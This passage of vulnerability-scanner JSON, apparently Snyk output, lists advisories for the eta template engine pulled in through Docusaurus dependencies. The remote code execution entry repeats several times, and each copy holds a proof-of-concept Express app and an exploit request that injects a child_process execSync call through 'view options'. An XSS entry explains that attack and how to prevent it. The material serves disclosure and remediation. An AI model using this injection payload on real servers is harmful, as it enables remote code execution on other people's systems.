      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [GitHub Release](https://github.com/eta-dev/eta/releases/tag/v2.0.0)\n",
      "epssDetails": {
        "percentile": "0.18312",
        "probability": "0.00052",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-23630"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-xrh7-m5pp-39r6"
        ]
      },
      "packageName": "eta",
      "proprietary": false,
      "creationTime": "2023-02-01T09:24:55.728670Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-01-31T22:39:40Z",
      "packageManager": "npm",
      "publicationTime": "2023-02-01T13:47:00.613727Z",
      "modificationTime": "2023-02-14T15:04:12.598888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-3261240",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Agustin Gianni"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/releases/tag/v2.0.0",
          "title": "GitHub Release"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2023-02-14T15:04:12.598888Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `renderFile` function, due to improper user-input sanitization. \r\n\r\n## Workaround\r\n\r\nUsers who are unable to upgrade should not pass user supplied data directly to `res.renderFile`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web 